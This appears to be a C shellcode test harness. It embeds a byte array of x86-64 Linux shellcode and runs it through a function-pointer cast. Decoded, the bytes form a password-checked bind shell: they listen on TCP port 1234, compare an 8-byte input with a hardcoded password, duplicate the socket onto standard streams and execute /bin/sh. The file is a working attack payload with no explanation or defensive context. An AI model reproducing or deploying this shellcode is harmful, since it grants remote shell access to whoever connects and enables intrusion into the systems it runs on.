#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x48\x31\xf6\x48\xf7\xe6\x6a\x02\x5f\xff\xc6\xb0\x29\x0f\x05\x52\x52\x66\xc7\x44\x24\x02\x04\xd2\xc6\x04\x24\x02\x48\x97\x54\x5e\xb2\x10\xb0\x31\x0f\x05\x6a\x01\x5e\xb0\x32\x0f\x05\x54\x5e\x88\x54\x24\xff\x48\xff\xcc\x54\x5a\xb0\x2b\x0f\x05\x48\x97\x48\x31\xc0\x99\x50\x54\x5e\xb2\x08\x0f\x05\x57\x56\x48\xb8\x61\x6e\x64\x62\x72\x75\x6e\x61\x5f\x48\xaf\x75\x24\x5f\x48\x31\xc0\x6a\x03\x5e\xb0\x21\xff\xce\x0f\x05\x75\xf8\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x48\xf7\xee\xb0\x3b\x0f\x05\x6a\x3c\x58\x0f\x05";

int main()
{

	printf("Shellcode length: %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
